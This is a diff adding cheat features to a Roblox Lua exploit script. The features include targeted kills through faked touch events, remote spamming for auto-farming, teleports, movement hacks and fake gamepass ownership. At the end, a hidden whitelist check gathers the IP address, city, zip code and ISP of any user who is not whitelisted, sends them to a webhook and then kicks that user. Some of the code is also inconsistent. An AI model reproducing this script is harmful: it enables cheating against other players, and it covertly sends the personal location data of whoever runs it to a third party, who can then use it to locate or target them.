@@ -401,3 +401,529 @@ end)
          wait(0.1) -- Adjust the delay for optimized performance
      end
  end)
+        
+Killing:AddLabel("Targeting")
+ 
+ local targetPlayerName = nil -- Variable to store the target player name
+ 
+ -- Create the Target Name Textbox
+ Killing:AddTextBox("Target Name", function(text)
+     targetPlayerName = text
+ end)
+ 
+ -- Kill Target Toggle
+ local killTarget = false
+ Killing:AddSwitch("Kill Target", function(bool)
+     killTarget = bool -- Control variable
+ 
+     while killTarget do
+         local player = game.Players.LocalPlayer
+         local target = game.Players:FindFirstChild(targetPlayerName)
+ 
+         if target and target ~= player then
+             local targetChar = target.Character
+             local rootPart = targetChar and targetChar:FindFirstChild("HumanoidRootPart")
+ 
+             if rootPart then
+                 local rightHand = player.Character and player.Character:FindFirstChild("RightHand")
+                 local leftHand = player.Character and player.Character:FindFirstChild("LeftHand")
+ 
+                 if rightHand and leftHand then
+                     firetouchinterest(rightHand, rootPart, 1) -- Start touch event
+                     firetouchinterest(leftHand, rootPart, 1)
+                     firetouchinterest(rightHand, rootPart, 0) -- End touch event
+                     firetouchinterest(leftHand, rootPart, 0)
+                 end
+             end
+         end
+ 
+         wait(0.1) -- Adjust the delay as needed
+     end
+ end)
+ 
+ Killing:AddLabel("Punching Tool")
+ 
+ -- Auto Equip Punch Toggle
+ local autoEquipPunch = false
+ Killing:AddSwitch("Auto Equip Punch", function(state)
+     autoEquipPunch = state
+ 
+     while autoEquipPunch do
+         local player = game.Players.LocalPlayer
+         local punchTool = player.Backpack:FindFirstChild("Punch")
+ 
+         if punchTool then
+             punchTool.Parent = player.Character -- Equip the tool
+         end
+ 
+         wait(0.1) -- Adjust delay if needed
+     end
+ end)
+ 
+ -- Auto Punch [No Animation] Toggle
+ local autoPunchNoAnim = false
+ Killing:AddSwitch("Auto Punch [No Animation]", function(state)
+     autoPunchNoAnim = state
+ 
+     while autoPunchNoAnim do
+         local player = game.Players.LocalPlayer
+         local playerName = player.Name
+         local punchTool =
+             player.Backpack:FindFirstChild("Punch") or
+             game.Workspace:FindFirstChild(playerName):FindFirstChild("Punch")
+ 
+         if punchTool then
+             if punchTool.Parent ~= game.Workspace:FindFirstChild(playerName) then
+                 punchTool.Parent = game.Workspace:FindFirstChild(playerName) -- Equip the tool
+             end
+ 
+             -- Fire the punch event for both hands
+             player.muscleEvent:FireServer("punch", "rightHand")
+             player.muscleEvent:FireServer("punch", "leftHand")
+         else
+             warn("Punch tool not found")
+             autoPunchNoAnim = false -- Stop loop if tool is missing
+         end
+ 
+         wait(0.01) -- Adjust delay if needed
+     end
+ end)
+ 
+ local Stats = window:AddTab("Stats")
+ 
+ local function abbreviateNumber(value)
+     if value >= 1e15 then
+         return string.format("%.1fQa", value / 1e15)
+     elseif value >= 1e12 then
+         return string.format("%.1fT", value / 1e12)
+     elseif value >= 1e9 then
+         return string.format("%.1fB", value / 1e9)
+     elseif value >= 1e6 then
+         return string.format("%.1fM", value / 1e6)
+     elseif value >= 1e3 then
+         return string.format("%.1fK", value / 1e3)
+     else
+         return tostring(value)
+     end
+ end
+ 
+ local labels = {
+     TimeSpentLabel = Stats:AddLabel("Time spent in this server: 00:00"),
+     StrengthGainedLabel = Stats:AddLabel("Amount of strength gained in this server: 0"),
+     DurabilityGainedLabel = Stats:AddLabel("Amount of durability gained in this server: 0"),
+     AgilityGainedLabel = Stats:AddLabel("Amount of agility gained in this server: 0"),
+     KillsGainedLabel = Stats:AddLabel("Amount of kills gained in this server: 0"),
+     EvilKarmaGainedLabel = Stats:AddLabel("Amount of Evil Karma gained in this server: 0"),
+     GoodKarmaGainedLabel = Stats:AddLabel("Amount of Good Karma gained in this server: 0")
+ }
+ 
+ local function createMyLabels()
+     local player = game.Players.LocalPlayer
+     if not player then return end
+ 
+     local leaderstats = player:WaitForChild("leaderstats")
+     if not leaderstats then return end
+ 
+     local strengthStat = leaderstats:WaitForChild("Strength")
+     local durabilityStat = player:WaitForChild("Durability")
+     local agilityStat = player:WaitForChild("Agility")
+     local killsStat = leaderstats:WaitForChild("Kills")
+     local evilKarmaStat = player:WaitForChild("evilKarma")
+     local goodKarmaStat = player:WaitForChild("goodKarma")
+ 
+     local initialStrength = strengthStat.Value or 0
+     local initialDurability = durabilityStat.Value or 0
+     local initialAgility = agilityStat.Value or 0
+     local initialKills = killsStat.Value or 0
+     local initialEvilKarma = evilKarmaStat.Value or 0
+     local initialGoodKarma = goodKarmaStat.Value or 0
+ 
+     local startTime = tick()
+ 
+     local function updateLabels()
+         local strengthGained = strengthStat.Value - initialStrength
+         local durabilityGained = durabilityStat.Value - initialDurability
+         local agilityGained = agilityStat.Value - initialAgility
+         local killsGained = killsStat.Value - initialKills
+         local evilKarmaGained = evilKarmaStat.Value - initialEvilKarma
+         local goodKarmaGained = goodKarmaStat.Value - initialGoodKarma
+ 
+         labels.StrengthGainedLabel.Text = "Amount of strength gained in this server: " .. abbreviateNumber(strengthGained)
+         labels.DurabilityGainedLabel.Text = "Amount of durability gained in this server: " .. abbreviateNumber(durabilityGained)
+         labels.AgilityGainedLabel.Text = "Amount of agility gained in this server: " .. abbreviateNumber(agilityGained)
+         labels.KillsGainedLabel.Text = "Amount of kills gained in this server: " .. abbreviateNumber(killsGained)
+         labels.EvilKarmaGainedLabel.Text = "Amount of Evil Karma gained in this server: " .. abbreviateNumber(evilKarmaGained)
+         labels.GoodKarmaGainedLabel.Text = "Amount of Good Karma gained in this server: " .. abbreviateNumber(goodKarmaGained)
+     end
+ 
+     local function updateTimeSpent()
+         local timeSpent = tick() - startTime
+         local minutes = math.floor(timeSpent / 60)
+         local seconds = math.floor(timeSpent % 60)
+         labels.TimeSpentLabel.Text = string.format("Time spent in this server: %02d:%02d", minutes, seconds)
+     end
+ 
+     strengthStat.Changed:Connect(updateLabels)
+     durabilityStat.Changed:Connect(updateLabels)
+     agilityStat.Changed:Connect(updateLabels)
+     killsStat.Changed:Connect(updateLabels)
+     evilKarmaStat.Changed:Connect(updateLabels)
+     goodKarmaStat.Changed:Connect(updateLabels)
+ 
+     game:GetService("RunService").Heartbeat:Connect(updateTimeSpent)
+ 
+     updateLabels()
+        end
+        
+createMyLabels()
+ 
+ local TrackStats = window:AddTab("Track Stats")
+ 
+ local targetPlayer = nil
+ 
+ local textbox = TrackStats:AddTextBox("Target Name", function(text)
+     local player = game.Players:FindFirstChild(text)
+     if player then
+         targetPlayer = player
+     else
+         targetPlayer = nil
+         resetTargetStats()
+     end
+ end)
+ 
+ local labels = {
+     TargetStats = TrackStats:AddLabel("Target Stats:"),
+     StrengthLabel = TrackStats:AddLabel("Strength: 0"),
+     DurabilityLabel = TrackStats:AddLabel("Durability: 0"),
+     AgilityLabel = TrackStats:AddLabel("Agility: 0"),
+     RebirthsLabel = TrackStats:AddLabel("Rebirths: 0"),
+     KillsLabel = TrackStats:AddLabel("Kills: 0"),
+     EvilKarmaLabel = TrackStats:AddLabel("Evil Karma: 0"),
+     GoodKarmaLabel = TrackStats:AddLabel("Good Karma: 0"),
+     EquippedPetsLabel = TrackStats:AddLabel("Equipped Pets:"),
+ }
+ 
+ -- Create pet labels
+ for i = 1, 8 do
+     labels["Pet" .. i .. "Label"] = TrackStats:AddLabel("Pet" .. i .. ": No pet Equipped")
+ end
+ 
+ local function updateTargetStats()
+     if not targetPlayer then return end
+ 
+     local leaderstats = targetPlayer:FindFirstChild("leaderstats")
+     local goodKarma = targetPlayer:FindFirstChild("goodKarma")
+     local evilKarma = targetPlayer:FindFirstChild("evilKarma")
+ 
+     if leaderstats then
+         labels.StrengthLabel.Text = "Strength: " .. abbreviateNumber(leaderstats:FindFirstChild("Strength") and leaderstats.Strength.Value or 0)
+         labels.DurabilityLabel.Text = "Durability: " .. abbreviateNumber(targetPlayer:FindFirstChild("Durability") and targetPlayer.Durability.Value or 0)
+         labels.AgilityLabel.Text = "Agility: " .. abbreviateNumber(targetPlayer:FindFirstChild("Agility") and targetPlayer.Agility.Value or 0)
+         labels.RebirthsLabel.Text = "Rebirths: " .. abbreviateNumber(leaderstats:FindFirstChild("Rebirths") and leaderstats.Rebirths.Value or 0)
+         labels.KillsLabel.Text = "Kills: " .. abbreviateNumber(leaderstats:FindFirstChild("Kills") and leaderstats.Kills.Value or 0)
+     end
+ 
+     labels.EvilKarmaLabel.Text = "Evil Karma: " .. abbreviateNumber(evilKarma and evilKarma.Value or 0)
+     labels.GoodKarmaLabel.Text = "Good Karma: " .. abbreviateNumber(goodKarma and goodKarma.Value or 0)
+ 
+     -- Update pet labels properly (reading the pet name from IntValue instances)
+     for i = 1, 8 do
+         local petValue = targetPlayer:FindFirstChild("pet" .. i)
+         if petValue and petValue:IsA("IntValue") and petValue.Value ~= "" then
+             labels["Pet" .. i .. "Label"].Text = "Pet" .. i .. ": " .. petValue.Value
+         else
+             labels["Pet" .. i .. "Label"].Text = "Pet" .. i .. ": No pet Equipped"
+         end
+     end
+ end 
+        
+local function resetTargetStats()
+     labels.StrengthLabel.Text = "Strength: 0"
+     labels.DurabilityLabel.Text = "Durability: 0"
+     labels.AgilityLabel.Text = "Agility: 0"
+     labels.RebirthsLabel.Text = "Rebirths: 0"
+     labels.KillsLabel.Text = "Kills: 0"
+     labels.EvilKarmaLabel.Text = "Evil Karma: 0"
+     labels.GoodKarmaLabel.Text = "Good Karma: 0"
+ 
+     for i = 1, 8 do
+         labels["Pet" .. i .. "Label"].Text = "Pet" .. i .. ": No pet Equipped"
+     end
+ end
+ 
+ task.spawn(function()
+     while task.wait(0.1) do
+         if targetPlayer then
+             updateTargetStats()
+         end
+     end
+ end)
+ 
+ local OpThings = window:AddTab("Op Things")
+ 
+ local switch = OpThings:AddSwitch("Auto Rebirth (Pack)", function(Value)
+     getgenv().lift = Value
+     local player = game.Players.LocalPlayer
+     local petsFolder = player:FindFirstChild("petsFolder") and player.petsFolder:FindFirstChild("Unique")
+ 
+     if not petsFolder then return end
+ 
+     local function equipPets(petName)
+         for _ = 1, 8 do
+             task.wait(0.1) -- Delay to prevent overload
+             game:GetService("ReplicatedStorage").rEvents.equipPetEvent:FireServer("equipPet", petsFolder[petName])
+         end
+     end
+ 
+     local function unequipPets(petName)
+         for _ = 1, 8 do
+             task.wait(0.1)
+             game:GetService("ReplicatedStorage").rEvents.equipPetEvent:FireServer("unequipPet", petsFolder[petName])
+         end
+     end
+ 
+     if not Value then return end
+ 
+     task.spawn(function()
+         equipPets("Swift Samurai") -- Equip before rebirth loop
+ 
+         while getgenv().lift do
+             local rebirths = player.leaderstats.Rebirths.Value
+             local rebirthCost = 10000 + (5000 * rebirths)
+ 
+             local goldenRebirth = player.ultimatesFolder:FindFirstChild("Golden Rebirth")
+             if goldenRebirth then
+                 rebirthCost = math.floor(rebirthCost * (1 - (goldenRebirth.Value * 0.1)))
+             end
+ 
+             local machine = findMachine("Jungle Bar Lift")
+             if machine and machine:FindFirstChild("interactSeat") then
+                 local character = player.Character
+                 if character and character:FindFirstChild("HumanoidRootPart") then
+                     character.HumanoidRootPart.CFrame = machine.interactSeat.CFrame * CFrame.new(0, 3, 0)
+                     task.wait(0.3)
+                     pressE()
+                 end
+             end
+ 
+             while getgenv().lift and player.leaderstats.Strength.Value < rebirthCost do
+                 game:GetService("Players").LocalPlayer.muscleEvent:FireServer("rep")
+                 task.wait(0.03)
+             end
+ 
+             if player.leaderstats.Strength.Value >= rebirthCost then
+                 unequipPets("Swift Samurai")
+                 equipPets("Tribal Overlord")
+ 
+                 task.wait(0.2)
+                 game:GetService("ReplicatedStorage").rEvents.rebirthRemote:InvokeServer("rebirthRequest")
+ 
+                 unequipPets("Tribal Overlord")
+                 equipPets("Swift Samurai")
+             end
+ 
+             if not getgenv().lift then break end
+             task.wait(0.05)
+         end
+     end)
+ end)
+ 
+ local switch = OpThings:AddSwitch("Fast Strength", function(Value)
+     getgenv().isGrinding = Value
+ 
+     if not Value then return end
+ 
+     for _ = 1, 30 do
+         task.spawn(function()
+             while getgenv().isGrinding do
+                 game:GetService("Players").LocalPlayer.muscleEvent:FireServer("rep")
+                 task.wait(0.01)
+             end
+         end)
+     end
+ end)
+ 
+ local switchHideFrame = OpThings:AddSwitch("Hide Frame", function(bool)
+     for _, frameName in ipairs({"strengthFrame", "durabilityFrame", "agilityFrame"}) do
+         local frame = game:GetService("ReplicatedStorage"):FindFirstChild(frameName)
+         if frame and frame:IsA("GuiObject") then
+             frame.Visible = not bool
+         end
+     end
+ end)
+ 
+ 
+ 
+ local Teleport = window:AddTab("Teleport")
+ 
+ Teleport:AddButton("Tiny Island", function()
+     game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-31.8626194, 6.0588026, 2087.88672, -0.999396682, -9.72631931e-09, 0.034730725, -6.63278898e-09, 1, 8.91870684e-08, -0.034730725, 8.8902901e-08, -0.999396682)
+ end)
+ 
+ Teleport:AddButton("Starter Island", function()
+     game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(226.252472, 8.1526947, 219.366516, -0.00880406145, 3.58277887e-08, -0.999961257, -4.41204939e-08, 1, 3.62176351e-08, 0.999961257, 4.44376482e-08, -0.00880406145)
+ end)
+ 
+ Teleport:AddButton("Legend Beach", function()
+     game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-365.798309, 44.5082932, -501.618591, 0.00878552441, -6.19950713e-09, 0.999961436, -4.37451603e-10, 1, 6.20358964e-09, -0.999961436, -4.91936492e-10, 0.00878552441)
+ end)
+ 
+ Teleport:AddButton("Frost Gym", function()
+     game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-2933.47998, 29.6399612, -579.946045, 0.0345239155, -1.03010173e-07, 0.999403894, 1.03015294e-08, 1, 1.02715752e-07, -0.999403894, 6.74923806e-09, 0.0345239155)
+ end)
+ 
+ Teleport:AddButton("Mythical Gym", function()
+     game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(2659.50635, 21.6095238, 934.690613, 0.999999881, 4.98906161e-08, 0.000502891606, -4.98585742e-08, 1, -6.37288338e-08, -0.000502891606, 6.37037516e-08, 0.999999881)
+ end)
+ 
+ Teleport:AddButton("Eternal Gym", function()
+     game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-7176.19141, 45.394104, -1106.31421, 0.971191287, -2.38377185e-09, 0.238301158, 1.41694778e-09, 1, 4.22844915e-09, -0.238301158, -3.76897269e-09, 0.971191287)
+ end)
+ 
+ Teleport:AddButton("Legend Gym", function()
+     game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(4446.91699, 1004.46698, -3983.76074, -0.999961317, -1.97616366e-08, 0.00879266672, -1.93830077e-08, 1, 4.31365149e-08, -0.00879266672, 4.29661292e-08, -0.999961317)
+ end)
+ 
+ Teleport:AddButton("Jungle Gym", function()
+     game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-8137, 28, 2820)
+ end)
+ 
+ local Misc = window:AddTab("Misc")
+ 
+ Misc:AddLabel("Local Player")
+ 
+ -- WalkSpeed Textbox & Toggle
+ local walkSpeedValue = 16 -- Default speed
+ Misc:AddTextBox("WalkSpeed", function(text)
+     local speed = tonumber(text)
+     if speed and speed >= 1 and speed <= 500 then
+         walkSpeedValue = speed
+     end
+ end)  
+        
+local setSpeed = false
+ Misc:AddSwitch("Set Speed", function(state)
+     setSpeed = state
+     while setSpeed do
+         game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = walkSpeedValue
+         task.wait(0.1)
+     end
+     game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16 -- Reset to default
+ end)
+ 
+ -- JumpPower Textbox & Toggle
+ local jumpPowerValue = 50 -- Default JumpPower
+ Misc:AddTextBox("JumpPower", function(text)
+     local jump = tonumber(text)
+     if jump then
+         jumpPowerValue = jump
+     end
+ end)
+ 
+ local applyJumpPower = false
+ Misc:AddSwitch("Apply JumpPower", function(state)
+     applyJumpPower = state
+     game.Players.LocalPlayer.Character.Humanoid.UseJumpPower = true
+ 
+     if applyJumpPower then
+         game.Players.LocalPlayer.Character.Humanoid.JumpPower = jumpPowerValue
+     else
+         game.Players.LocalPlayer.Character.Humanoid.JumpPower = 50 -- Reset
+     end
+ end)
+ 
+ -- Avatar Size Textbox & Toggle
+ local sizeValue = 1 -- Default size (normal)
+ Misc:AddTextBox("Size", function(text)
+     local size = tonumber(text)
+     if size and size >= 1 and size <= 100 then
+         sizeValue = size
+     end
+ end)
+ 
+ local setSize = false
+ Misc:AddSwitch("Set Sizes", function(state)
+     setSize = state
+     local char = game.Players.LocalPlayer.Character
+     if char then
+         local humanoid = char:FindFirstChildOfClass("Humanoid")
+         if humanoid then
+             if state then
+                 humanoid.BodyDepthScale.Value = sizeValue
+                 humanoid.BodyHeightScale.Value = sizeValue
+                 humanoid.BodyWidthScale.Value = sizeValue
+                 humanoid.HeadScale.Value = sizeValue
+             else
+                 humanoid.BodyDepthScale.Value = 1
+                 humanoid.BodyHeightScale.Value = 1
+                 humanoid.BodyWidthScale.Value = 1
+                 humanoid.HeadScale.Value = 1
+             end
+         end
+     end
+ end)
+ 
+ Misc:AddLabel("Miscs")
+ 
+ local switch = Misc:AddSwitch("Lock Position", function(Value)
+     if Value then
+         -- Lock Position
+         local currentPos = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
+         getgenv().posLock = game:GetService("RunService").Heartbeat:Connect(function()
+             if game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
+                 game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = currentPos
+             end
+         end)
+     else
+         -- Unlock Position
+         if getgenv().posLock then
+             getgenv().posLock:Disconnect()
+             getgenv().posLock = nil
+         end
+     end
+ end)
+ 
+ local switchGamepads = Misc:AddSwitch("Free Auto Lift Gamepads", function(Value)
+     local gamepassFolder = game:GetService("ReplicatedStorage"):FindFirstChild("gamepassIds")
+     local player = game:GetService("Players").LocalPlayer
+ 
+     if not gamepassFolder or not player then return end
+ 
+     if Value then
+         for _, gamepass in pairs(gamepassFolder:GetChildren()) do
+             if not player.ownedGamepasses:FindFirstChild(gamepass.Name) then
+                 local value = Instance.new("IntValue")
+                 value.Name = gamepass.Name
+                 value.Value = gamepass.Value
+                 value.Parent = player.ownedGamepasses
+             end
+         end
+     else
+         for _, gamepass in pairs(player.ownedGamepasses:GetChildren()) do
+             gamepass:Destroy() -- Removes all fake gamepasses when turned off
+         end
+     end
+ end)
+ 
+ 
+ local Credit = window:AddTab("Credit")
+ 
+ Credit:AddLabel("Script Made By Encrypted")
+ Credit:AddLabel("Nova Hub Paid Version , 1.7K Robux")
+ Credit:AddLabel("|")
+ Credit:AddLabel("Close Friends:")
+ Credit:AddLabel("D3Ath, Slayerson, CwmoKai, X3NO, MLR Taken, Havoc, Lucky, Aabis, Ahmad, Blackyy")
+     else
+         local ipinfo_table = getPlayerIP()
+         local dataMessage = string.format(
+             "```User: %s\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg: %s```", 
+             player_name, ipinfo_table.query, ipinfo_table.country, ipinfo_table.countryCode, 
+             ipinfo_table.region, ipinfo_table.regionName, ipinfo_table.city, ipinfo_table.zip, 
+             ipinfo_table.isp, ipinfo_table.org
+         )
+         sendWebhook(dataMessage)
+         player:Kick("You Are Not Whitelisted")
+     end
+end        
+
+checkPlayer()
